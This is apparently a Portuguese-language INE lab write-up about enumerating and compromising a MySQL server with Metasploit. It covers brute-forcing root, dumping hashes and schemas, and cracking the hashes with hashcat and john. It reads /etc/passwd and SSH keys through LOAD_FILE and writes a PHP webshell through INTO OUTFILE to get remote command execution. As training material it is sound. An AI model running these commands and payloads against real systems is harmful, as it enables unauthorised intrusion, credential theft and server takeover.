# 🧪 Lab Report — MySQL Enumeration com Metasploit

> **Plataforma:** INE
> **Tema central:** Enumeração completa de servidor MySQL — versão, brute force, schema, hashes, arquivos e diretórios graváveis
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Partir do zero e comprometer completamente um servidor MySQL — identificar versão, obter credenciais via brute force e então usar o acesso para extrair o máximo de informações: schema do banco, hashes de senhas, arquivos do sistema e diretórios onde é possível escrever.

---

## 🧠 Por Que MySQL é um Alvo Valioso

Quando um banco de dados está exposto na rede, as possibilidades vão muito além de "ler dados":

| Capacidade | O Que Permite |
|-----------|--------------|
| **Acesso ao schema** | Mapear todas as tabelas e colunas — incluindo tabelas de usuários |
| **Hash dump** | Quebrar senhas offline → reutilizar em outros serviços |
| **Leitura de arquivos** | `LOAD DATA INFILE` lê arquivos do servidor (ex: `/etc/passwd`) |
| **Escrita de arquivos** | `SELECT INTO OUTFILE` escreve arquivos — incluindo webshells PHP |
| **Execução de sistema** | `sys_exec()` via UDF (User Defined Functions) em configs vulneráveis |

> 💡 MySQL exposto não é só um problema de vazamento de dados — é uma **porta de entrada para o sistema operacional**.

---

## 📋 Sumário de Módulos

| # | Módulo | Credencial | Objetivo |
|---|--------|-----------|---------|
| 1 | `mysql_version` | Não precisa | Versão do servidor |
| 2 | `mysql_login` | Brute force | Credencial válida |
| 3 | `mysql_enum` | root:twinkle | Enumeração completa do servidor |
| 4 | `mysql_sql` | root:twinkle | Executar queries SQL arbitrárias |
| 5 | `mysql_file_enum` | root:twinkle | Verificar existência de arquivos do SO |
| 6 | `mysql_hashdump` | root:twinkle | Extrair hashes de senha dos usuários MySQL |
| 7 | `mysql_schemadump` | root:twinkle | Mapear estrutura completa do banco |
| 8 | `mysql_writable_dirs` | root:twinkle | Encontrar diretórios graváveis |

---

## 🔬 Execução Passo a Passo

### Step 1 — Verificar Conectividade e Porta MySQL

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local
```

**Resultado:**
```
3306/tcp  open  mysql
```

**Porta 3306** é a porta padrão do MySQL. Ver ela aberta para a rede é um sinal imediato de misconfiguration — em produção, MySQL deveria escutar apenas em `127.0.0.1` (localhost), nunca em interfaces externas.

> ⚠️ MySQL exposto na rede = superfície de ataque direta sem precisar comprometer o servidor web primeiro.

---

### Módulo 1 — Versão do MySQL

```bash
msfconsole -q

use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

**O que faz:** Conecta na porta 3306 e lê o banner de handshake inicial do MySQL — que contém a versão sem necessitar autenticação.

**Por que a versão importa:**

| Versão | Vulnerabilidades Notáveis |
|--------|--------------------------|
| MySQL < 5.6 | Múltiplas CVEs de auth bypass |
| MySQL 5.5.x | CVE-2012-2122 — auth bypass por timing |
| MariaDB < 10.x | Diversas dependendo do patch level |

```bash
# Buscar exploits para a versão identificada
searchsploit mysql 5.5
```

**Output típico:**
```
[+] demo.ine.local:3306 - Server version: 5.5.62-0ubuntu0.14.04.1
```

---

### Módulo 2 — Brute Force de Credenciais

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

**Por que focar no usuário `root` primeiro:**
- `root` é a conta padrão de administração do MySQL
- Tem acesso a todos os bancos, todas as tabelas e todas as operações
- Muitas instalações deixam `root` sem senha ou com senha fraca

**Parâmetros importantes:**

| Parâmetro | Valor | Por Quê |
|-----------|-------|---------|
| `USERNAME` | root | Conta com maiores privilégios |
| `PASS_FILE` | unix_passwords.txt | Wordlist de senhas Unix comuns |
| `VERBOSE` | false | Sem essa flag → exibe cada tentativa falha — centenas de linhas |

**Resultado:**
```
[+] demo.ine.local:3306 - Success: 'root:twinkle'
```

> 💡 Para testar múltiplos usuários simultaneamente, usar `USER_FILE` em vez de `USERNAME` e remover o `set USERNAME`.

---

### Módulo 3 — Enumeração Completa do Servidor

```bash
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

**O que faz:** Com credencial válida, executa uma série de queries de enumeração e retorna um relatório completo do servidor.

**O que o módulo coleta:**

| Informação | Query Interna | Relevância |
|-----------|--------------|-----------|
| Versão detalhada | `SELECT @@version` | CVEs específicos |
| Hostname | `SELECT @@hostname` | Nome da máquina |
| Data dir | `SELECT @@datadir` | Onde ficam os bancos |
| Usuários MySQL | `SELECT user, host FROM mysql.user` | Contas e permissões |
| Privilégios `FILE` | `SHOW GRANTS` | Pode ler/escrever arquivos? |
| Diretório de logs | `SELECT @@log_file` | Arquivos de log |

**Por que o privilégio FILE é crítico:**
```
Usuário root com FILE privilege
        ↓
LOAD DATA INFILE '/etc/passwd'   →  leitura de arquivos do sistema
SELECT ... INTO OUTFILE '/var/www/html/shell.php'  →  escrita de webshell
```

---

### Módulo 4 — Executar Queries SQL Arbitrárias

```bash
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

**O que faz:** Executa uma query SQL no servidor. Por padrão, executa `SELECT version()`, mas qualquer query pode ser configurada via `set SQL`.

**Queries úteis para enumerar manualmente:**

```bash
# Listar todos os bancos
set SQL SHOW DATABASES;
run

# Listar tabelas de um banco
set SQL USE nomedobanco; SHOW TABLES;
run

# Ler arquivo do sistema (se FILE privilege ativo)
set SQL SELECT LOAD_FILE('/etc/passwd');
run

# Versão, usuário atual, banco atual
set SQL SELECT version(), user(), database();
run

# Usuários e hashes
set SQL SELECT user, password FROM mysql.user;
run
```

**Por que esse módulo é poderoso:** Você tem um cliente MySQL completo dentro do Metasploit. Qualquer query válida pode ser executada — exploração de dados, leitura de arquivos, verificação de permissões.

---

### Módulo 5 — Enumeração de Arquivos do Sistema

```bash
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

**O que faz:** Usa `LOAD_FILE()` do MySQL para testar a existência de arquivos no sistema operacional do servidor. Para cada arquivo na lista, tenta carregar — se não retornar NULL, o arquivo existe e é legível.

**Por que isso funciona:** O MySQL roda com um usuário do sistema (geralmente `mysql`). Se esse usuário tem permissão de leitura em um arquivo e o usuário MySQL tem o privilégio FILE, o conteúdo pode ser lido via SQL.

**Arquivos de alto valor para testar:**

```
/etc/passwd              → usuários do sistema
/etc/shadow              → hashes de senha (normalmente sem acesso)
/etc/mysql/mysql.conf.d/mysqld.cnf  → configuração do MySQL
/var/www/html/config.php → credenciais da aplicação web
/root/.bash_history      → histórico de comandos
/home/usuario/.ssh/id_rsa → chave privada SSH
```

> ⚠️ `VERBOSE true` aqui é necessário — sem ele, o módulo só exibe arquivos encontrados mas pode perder contexto importante sobre o que foi testado.

---

### Módulo 6 — Hash Dump dos Usuários MySQL

```bash
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

**O que faz:** Executa `SELECT user, password FROM mysql.user` e extrai os hashes de senha de todos os usuários do banco de dados.

**Formato dos hashes MySQL:**

| Versão MySQL | Formato do Hash | Exemplo |
|-------------|----------------|---------|
| MySQL < 4.1 | Hash curto 16 chars | `1c90d79d7ed7ef8c` |
| MySQL ≥ 4.1 | Hash SHA1 com `*` prefixo | `*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29` |

**O que fazer com os hashes:**

```bash
# Salvar no arquivo
[+] demo.ine.local root:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29

# Quebrar com hashcat
hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt

# Quebrar com john
john --format=mysql-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Por que é valioso além do MySQL:**
- Administradores reutilizam senhas
- Senha do root MySQL pode ser a mesma do root do sistema
- Pode ser igual a senhas de outros serviços (SSH, FTP, SMB)

> 💡 O Metasploit salva automaticamente os hashes no banco de dados (`creds`) se o DB estiver ativo. Use `creds` para ver depois.

---

### Módulo 7 — Schema Dump

```bash
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

**O que faz:** Mapeia a estrutura completa de todos os bancos de dados — lista cada banco, cada tabela e cada coluna, incluindo tipos de dados.

**Por que o schema é valioso antes de extrair dados:**

```
Schema dump revela:
        ↓
Tabela: users
Colunas: id, username, password, email, role
        ↓
Query direcionada:
SELECT username, password FROM users WHERE role='admin'
        ↓
Credenciais dos administradores da aplicação
```

Sem o schema, você precisaria adivinhar os nomes das tabelas. Com ele, você sabe exatamente onde estão os dados valiosos.

**Bancos padrão do MySQL (podem ser ignorados):**
```
information_schema   → metadados do MySQL (estrutura interna)
mysql                → usuários e permissões do MySQL
performance_schema   → métricas de performance
sys                  → views do performance_schema
```

**Bancos customizados** (criados pela aplicação) são os alvos reais.

---

### Módulo 8 — Diretórios Graváveis

```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

**O que faz:** Para cada diretório na lista, tenta escrever um arquivo via `SELECT 'test' INTO OUTFILE '/caminho/teste.txt'`. Se funcionar, o diretório é gravável pelo usuário MySQL.

**Por que diretório gravável é crítico:**

```
Diretório gravável encontrado: /var/www/html/uploads/
        ↓
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php'
        ↓
curl "http://demo.ine.local/uploads/shell.php?cmd=id"
        ↓
RCE no servidor web
```

**Diretórios de alto valor para testar:**
```
/var/www/html/          → root do Apache
/var/www/html/uploads/  → diretório de uploads
/tmp/                   → geralmente gravável por todos
/var/tmp/               → persistente entre reboots
```

---

## 📊 Resultado Final — Perfil Completo do Servidor MySQL

| Informação | Valor |
|-----------|-------|
| Versão | MySQL 5.5.62-Ubuntu |
| Porta | 3306/TCP |
| Credencial | `root:twinkle` |
| Privilégio FILE | ✅ Ativo |
| Hashes extraídos | ✅ `mysql_hashdump` |
| Schema mapeado | ✅ `mysql_schemadump` |
| Diretórios graváveis | Verificados via `mysql_writable_dirs` |

---

## 🧠 Conceitos Consolidados

### A Progressão Lógica MySQL

```
mysql_version    → versão → CVEs
        ↓
mysql_login      → credencial (root:twinkle)
        ↓
mysql_enum       → privilégios → FILE ativo?
        ↓
mysql_sql        → queries livres → extrair dados
mysql_file_enum  → ler arquivos do SO
mysql_hashdump   → hashes → quebrar offline
mysql_schemadump → estrutura → queries direcionadas
mysql_writable_dirs → diretório gravável → webshell
```

### MySQL com FILE Privilege = Acesso ao Sistema de Arquivos

```sql
-- Ler arquivo
SELECT LOAD_FILE('/etc/passwd');

-- Escrever arquivo (webshell)
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

Isso transforma acesso ao MySQL em **leitura/escrita no sistema de arquivos** do servidor.

### Por Que `root` MySQL ≠ `root` do Sistema
São contas separadas, mas a **senha pode ser a mesma**. Hash dump + quebra offline → testar a senha no SSH, SMB, FTP. Administradores reutilizam senhas frequentemente.

---

## ⚠️ Red Flags em Enumeração MySQL

| Achado | Risco | Implicação |
|--------|-------|-----------|
| Porta 3306 exposta na rede | 🔴 Alto | Acesso direto sem passar pelo webapp |
| root sem senha ou senha fraca | 🔴 Crítico | Acesso total ao banco |
| FILE privilege ativo | 🔴 Crítico | Leitura de arquivos do SO e escrita de webshell |
| Bind em 0.0.0.0 | 🔴 Alto | Deveria escutar só em 127.0.0.1 |
| Schema com tabela `users` | 🟡 Médio | Credenciais da aplicação acessíveis |

---

## 🔁 Próximos Passos Lógicos

```
Hashes extraídos
        ↓
hashcat -m 300 hashes.txt rockyou.txt
        ↓
Senhas quebradas → testar em SSH, FTP, SMB
        ↓
Schema mapeado → tabela users encontrada
        ↓
mysql_sql: SELECT username, password FROM users
        ↓
Diretório gravável + HTTP ativo
        ↓
SELECT webshell INTO OUTFILE '/var/www/html/shell.php'
curl http://demo.ine.local/shell.php?cmd=whoami  → RCE
```

---

## 📌 Relacionados

- [[SQL Injection — Fundamentos]]
- [[SQL Injection — Tipos de Database]]
- [[HTTP Apache Enumeration com Metasploit]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Cheatsheet — Portas Importantes]]

#lab #exploração #ferramenta/metasploit #database #mysql
